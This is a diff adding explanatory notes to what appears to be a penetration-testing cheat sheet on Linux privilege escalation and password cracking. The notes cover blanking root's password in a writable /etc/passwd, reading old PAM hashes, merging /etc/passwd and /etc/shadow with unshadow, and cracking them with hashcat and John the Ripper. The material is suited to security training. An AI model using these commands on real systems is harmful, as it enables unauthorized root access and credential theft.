@@ -43,6 +43,7 @@ If `/etc/passwd` is writable, remove root's password field:
 su
 # No password prompt — instant root shell
 ```
+> Remove the `x` in root's password field so the file has an empty second field. Linux interprets that as no password required. Then `su` to root without being prompted. Only works if `/etc/passwd` is world-writable — check with `ls -la /etc/passwd`.
 
 ---
 
@@ -92,6 +93,7 @@ PAM stores old passwords in `/etc/security/opasswd` to prevent reuse:
 sudo cat /etc/security/opasswd
 # cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
 ```
+> Shows old password hashes stored by PAM to enforce password history. Old entries often use weaker MD5 (`$1$`) hashing. Cracking these reveals password patterns the user likely still follows.
 
 - Old passwords may use weaker hashes (e.g., MD5 `$1$`)
 - Users reuse similar passwords — cracking old ones reveals patterns
@@ -107,6 +109,7 @@ sudo cp /etc/passwd /tmp/passwd.bak
 sudo cp /etc/shadow /tmp/shadow.bak
 unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
+> `unshadow` merges the passwd and shadow files into a single format JtR and hashcat can read. The result has the username, GECOS, and hash on one line per user. Copy the files first so you have originals.
 
 ### Step 2: Crack with hashcat or JtR
 
@@ -117,6 +120,7 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 # John the Ripper (single crack mode is ideal for unshadowed files)
 john --single /tmp/unshadowed.hashes
 ```
+> `-m 1800` targets SHA-512 crypt (`$6$`) Linux hashes. `-o` saves cracked results to a file. For JtR, single mode uses GECOS data from the combined file to generate guesses — often cracks passwords that rockyou misses.
 
 ### Hashcat Modes for Linux Hashes
 
@@ -153,6 +157,7 @@ unshadow passwd shadow > unshadowed.hashes
 # Single crack mode uses GECOS field (user's real name) to generate guesses
 john --single unshadowed.hashes --format=sha512crypt
 ```
+> Merges the provided passwd and shadow files, then runs JtR single crack mode. `--format=sha512crypt` forces the correct format for `$6$` hashes. JtR generates guesses from the GECOS field ("Martin Mendes" → "Martin1", etc.).
 
 - martin's GECOS: `Martin Mendes`
 - JtR mangled this into `Martin1` → **cracked**
@@ -163,6 +168,7 @@ john --single unshadowed.hashes --format=sha512crypt
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes --format=sha512crypt
 ```
+> Wordlist attack against SHA-512 Linux hashes. Explicit `--format=` prevents JtR from guessing the wrong format. Add `--rules` to apply JtR's built-in mutation rules to every rockyou entry.
 
 - sarah's password: `mariposa` → found in rockyou.txt
 
